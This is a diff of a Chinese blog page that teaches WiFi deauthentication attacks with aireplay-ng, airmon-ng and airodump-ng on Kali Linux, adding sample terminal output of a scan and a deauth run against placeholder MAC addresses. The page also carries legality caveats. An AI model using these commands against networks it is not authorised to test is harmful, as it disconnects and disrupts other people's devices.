@@ -29,12 +29,96 @@ ${t}
 </span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo airodump-ng wlan0mon
 </span></span></code></pre></td></tr></table></div></div><p>这将显示周围的所有WiFi网络的详细信息，包括SSID、BSSID和信号强度等信息。</p></li><li><p>找到您要攻击的WiFi网络的BSSID和信道。您可以在<code>airodump-ng</code>的输出中找到这些信息。</p></li><li><p>执行Deauthentication攻击。您可以使用以下命令：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo aireplay-ng --deauth &lt;数量&gt; -a &lt;BSSID&gt; -c &lt;目标设备的MAC地址&gt; wlan0mon
-</span></span></code></pre></td></tr></table></div></div><p>在上面的命令中，<code>&lt;数量></code>表示要发送的Deauthentication帧的数量，<code>&lt;BSSID></code>表示要攻击的WiFi网络的BSSID，<code>&lt;目标设备的MAC地址></code>表示要攻击的设备的MAC地址。<code>wlan0mon</code>是启用了监视模式的接口名称。</p><p>您可以使用<code>aireplay-ng</code>的其他选项来更改攻击的参数，例如更改攻击间隔时间或使用不同的攻击模式等。</p></li></ol><h2 id=注意事项>注意事项</h2><p>在执行WiFi Deauthentication攻击时，请注意以下几点：</p><ul><li>请确保您拥有合法的授权，并且只在法律允许的情况下使用此技术。</li><li>请勿将此技术用于未经授权的网络。</li><li>请勿将此技术用于任何非法用途。</li></ul><h2 id=结论>结论</h2><p>WiFi Deauthentication攻击是一种利用WiFi协议漏洞的攻击方式，可以使得连接到特定WiFi网络的设备无法继续与该网络通信。在Kali Linux中，您可以使用<code>aireplay-ng</code>和<code>airmon-ng</code>这两个工具来执行此类攻击。但请注意，这种攻击可能会导致法律问题，因此请确保您拥有合法的授权，并且只在法律允许的情况下使用此技术。</p><h2 id=视频效果演示>视频效果演示</h2><div class=video-wrapper><iframe src="https://player.bilibili.com/player.html?as_wide=1&amp;high_quality=1&amp;page=1&bvid=BV1Fj411o7FC&autoplay=0" scrolling=no frameborder=no framespacing=0 allowfullscreen></iframe></div><p>想看具体教程可以到我的Youtube频道看（B站审核严）</p></section><footer class=article-footer><section class=article-tags><a href=/tags/%E5%B7%A5%E5%85%B7/>工具</a>
+</span></span></code></pre></td></tr></table></div></div><p>在上面的命令中，<code>&lt;数量></code>表示要发送的Deauthentication帧的数量，<code>&lt;BSSID></code>表示要攻击的WiFi网络的BSSID，<code>&lt;目标设备的MAC地址></code>表示要攻击的设备的MAC地址。<code>wlan0mon</code>是启用了监视模式的接口名称。</p><p>您可以使用<code>aireplay-ng</code>的其他选项来更改攻击的参数，例如更改攻击间隔时间或使用不同的攻击模式等。</p></li></ol><p><strong>输出的结果</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>user@kali:~$ sudo airmon-ng start wlan0
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>sudo<span class=o>]</span> password <span class=k>for</span> user: 
+</span></span><span class=line><span class=cl>Found <span class=m>5</span> processes that could cause trouble.
+</span></span><span class=line><span class=cl>If airodump-ng, aireplay-ng or airtun-ng stops working after
+</span></span><span class=line><span class=cl>a short period of time, you may want to run <span class=s1>&#39;airmon-ng check kill&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  PID Name
+</span></span><span class=line><span class=cl>  <span class=m>789</span> NetworkManager
+</span></span><span class=line><span class=cl>  <span class=m>890</span> wpa_supplicant
+</span></span><span class=line><span class=cl>  <span class=m>901</span> dhclient
+</span></span><span class=line><span class=cl> <span class=m>1234</span> avahi-daemon
+</span></span><span class=line><span class=cl> <span class=m>1235</span> avahi-daemon
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>PHY	Interface	Driver		Chipset
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>phy0	wlan0		ath9k		Qualcomm Atheros AR9485 Wireless Network Adapter <span class=o>(</span>rev 01<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>		<span class=o>(</span>mac80211 monitor mode vif enabled <span class=k>for</span> <span class=o>[</span>phy0<span class=o>]</span>wlan0 on <span class=o>[</span>phy0<span class=o>]</span>wlan0mon<span class=o>)</span>
+</span></span><span class=line><span class=cl>		<span class=o>(</span>mac80211 station mode vif disabled <span class=k>for</span> <span class=o>[</span>phy0<span class=o>]</span>wlan0<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>user@kali:~$ sudo airodump-ng wlan0mon
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> CH  <span class=m>6</span> <span class=o>][</span> Elapsed: <span class=m>1</span> min <span class=o>][</span> 2023-08-03 14:00 <span class=o>][</span> fixed channel wlan0mon: -1                                         
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> BSSID              PWR RXQ  Beacons    <span class=c1>#Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> 00:11:22:33:44:55  -40 <span class=m>100</span>      <span class=m>600</span>      <span class=m>100</span>    <span class=m>2</span>   <span class=m>6</span>  54e. WPA2 CCMP   PSK  Wifi-1         
+</span></span><span class=line><span class=cl> AA:BB:CC:DD:EE:FF  -50   <span class=m>0</span>      <span class=m>500</span>        <span class=m>0</span>    <span class=m>0</span>   <span class=m>6</span>  54e. WPA2 CCMP   PSK  Wifi-2         
+</span></span><span class=line><span class=cl> FF:FF:FF:FF:FF:FF   -60   <span class=m>0</span>      <span class=m>400</span>        <span class=m>0</span>    <span class=m>0</span>   <span class=m>6</span>  54e. WPA2 CCMP   PSK  Wifi-3         
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> BSSID              STATION            PWR   Rate    Lost    Frames Probe
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> <span class=o>(</span>not associated<span class=o>)</span>   AA:BB:CC:DD:EE:FF   -1    -1 - -1      -        -1     
+</span></span><span class=line><span class=cl> <span class=o>(</span>not associated<span class=o>)</span>   BB:CC:DD:EE:FF:AA   -1    -1 - -1      -        -1     
+</span></span><span class=line><span class=cl> <span class=o>(</span>not associated<span class=o>)</span>   CC:DD:EE:FF:AA:BB   -1    -1 - -1      -        -1     
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>user@kali:~$ sudo aireplay-ng --deauth <span class=m>10</span> -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>14:01:23  Waiting <span class=k>for</span> beacon frame <span class=o>(</span>BSSID: 00:11:22:33:44:55<span class=o>)</span> on channel <span class=m>6</span>
+</span></span><span class=line><span class=cl>14:01:23  Sending <span class=m>10</span> directed DeAuth. STMAC: <span class=o>[</span>AA:BB:CC:DD:EE:FF<span class=o>]</span> <span class=o>[</span> 0<span class=p>|</span><span class=m>10</span> ACKs<span class=o>]</span>
+</span></span><span class=line><span class=cl>14:01:23  Sending <span class=m>10</span> directed DeAuth. STMAC: <span class=o>[</span>AA:BB:CC:DD:EE:FF<span class=o>]</span> <span class=o>[</span>10<span class=p>|</span><span class=m>10</span> ACKs<span class=o>]</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=注意事项>注意事项</h2><p>在执行WiFi Deauthentication攻击时，请注意以下几点：</p><ul><li>请确保您拥有合法的授权，并且只在法律允许的情况下使用此技术。</li><li>请勿将此技术用于未经授权的网络。</li><li>请勿将此技术用于任何非法用途。</li></ul><h2 id=结论>结论</h2><p>WiFi Deauthentication攻击是一种利用WiFi协议漏洞的攻击方式，可以使得连接到特定WiFi网络的设备无法继续与该网络通信。在Kali Linux中，您可以使用<code>aireplay-ng</code>和<code>airmon-ng</code>这两个工具来执行此类攻击。但请注意，这种攻击可能会导致法律问题，因此请确保您拥有合法的授权，并且只在法律允许的情况下使用此技术。</p><h2 id=视频效果演示>视频效果演示</h2><p>想看具体教程可以到我的Youtube频道看（B站审核严）</p></section><footer class=article-footer><section class=article-tags><a href=/tags/%E5%B7%A5%E5%85%B7/>工具</a>
 <a href=/tags/kali/>kali</a></section><section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg><span>Licensed under CC BY-NC-SA 4.0 转载或引用本文时请遵守许可协议，并注明出处不得用于商业用途！</span></section><section class=article-lastmod><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg><span>最后更新于 Jul 17, 2023 12:20 +07</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>相关文章</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/post/win7-login-reimg/><div class=article-details><h2 class=article-title>Windows7换登录页照片脚本</h2></div></a></article><article class=has-image><a href=/post/diannao-anzhuang--xitong/><div class=article-image><img src=/post/diannao-anzhuang--xitong/qwq.66c293c9aae615cf7f8422d91eaf423d_huebeee19731d74de7adcfef99764dde49_921040_250x150_fill_q75_h2_box_smart1_2.webp width=250 height=150 loading=lazy alt="Featured image of post P1电脑教程 安装系统篇" data-key=diannao-anzhuang--xitong data-hash="md5-ZsKTyarmFc9/hCLZHq9CPQ=="></div><div class=article-details><h2 class=article-title>P1电脑教程 安装系统篇</h2></div></a></article><article class=has-image><a href=/post/docker-zy/><div class=article-image><img src=/post/docker-zy/docker.ec528786076a5d5cd1e3652e05b89d7c_hu3435bf37bb55c978e693bb9bc8eabe17_6410_250x150_fill_q75_h2_box_smart1_2.webp width=250 height=150 loading=lazy alt="Featured image of post Docker 资源整合" data-key=docker-zy data-hash="md5-7FKHhgdqXVzR42UuBbidfA=="></div><div class=article-details><h2 class=article-title>Docker 资源整合</h2></div></a></article></div></div></aside><script src=//lib.baomitu.com/waline/2.14.8/waline.min.js></script>
 <link href=//lib.baomitu.com/waline/2.14.8/waline.min.css rel=stylesheet><div id=waline class=waline-container></div><style>.waline-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding);--waline-font-size:var(--article-font-size)}.waline-container .wl-count{color:var(--card-text-color-main)}</style><script>Waline.init({dark:'html[data-scheme="dark"]',el:"#waline",emoji:["https://unpkg.com/@waline/emojis@1.1.0/bilibili","https://unpkg.com/@waline/emojis@1.1.0/alus","https://unpkg.com/@waline/emojis@1.1.0/bmoji"],lang:"zh-CN",locale:{admin:"没有没有",placeholder:"用户在评论中所发表的言论仅代表其个人观点，与本网站立场无关。本站会审核所有评论，请不要发布垃圾和无意义信息"},requiredMeta:["name","email","url"],serverURL:"https://pl.xpdbk.com"})</script><footer class=site-footer><section class=copyright>&copy;
 2022 -
 2023 LEl_FENG的小屋</section><section class=powerby><a href=https://shengming.xpdbk.com/ target=_blank>本站声明</a> <a href=https://blog.xpdbk.com/sitemap.xml target=_blank>站点地图</a> <a href=https://blog.xpdbk.com/index.xml target=_blank>RSS订阅</a><br>Built with <a href=https://wordpress.org/ target=_blank rel=noopener>WordPress</a><br>主题 <b><a href=# target=_blank rel=noopener data-version=3.16.0>Stack Pro</a></b> 由 <a href=# target=_blank rel=noopener>JimmyCai</a> 设计
-<span>• 由LEl_FENG用❤️魔改</span></section><a href="https://icp.gov.moe/?keyword=20230087" target=_blank>萌ICP备20230087号</a><section class=powerby>📑共咕咕了 230.95k 字 · 共水了 69篇文章.</br><span><p></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<span>• 由LEl_FENG用❤️魔改</span></section><a href="https://icp.gov.moe/?keyword=20230087" target=_blank>萌ICP备20230087号</a><section class=powerby>📑共咕咕了 231.64k 字 · 共水了 69篇文章.</br><span><p></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
 <button class="pswp__button pswp__button--share" title=Share></button>
 <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
 <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
